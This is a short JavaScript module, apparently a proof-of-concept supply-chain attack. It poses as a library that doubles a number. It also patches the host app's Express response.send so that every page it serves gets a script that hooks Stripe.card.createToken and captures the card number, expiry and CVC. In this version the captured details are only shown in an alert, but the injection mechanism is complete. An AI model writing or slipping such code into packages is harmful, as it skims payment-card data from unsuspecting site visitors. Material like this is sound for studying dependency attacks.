
/* Main library
 * This returns the multiplied number
 * Also does malicious express injection
 */

module.exports = function(num) {
  return num * 2
}

var express = module.parent.require('express')
var original = express.response.send
var injection = function() {
  var original = Stripe.card.createToken
  Stripe.card.createToken = function(opts, cb) {
    var string = 'Malicious script has grabbed the following info:\n'
    string += 'Number: ' + opts.number + '\n'
    string += 'Expiry: ' + opts.exp_month + '/' + opts.exp_year + '\n'
    string += 'CVC: ' + opts.cvc + '\n'
    alert(string)
    original(opts, cb)
  }
}

express.response.send = function(content) {
  content = content + '<script>(' + injection.toString() + ')();</script>'
  original.bind(this)(content)
}
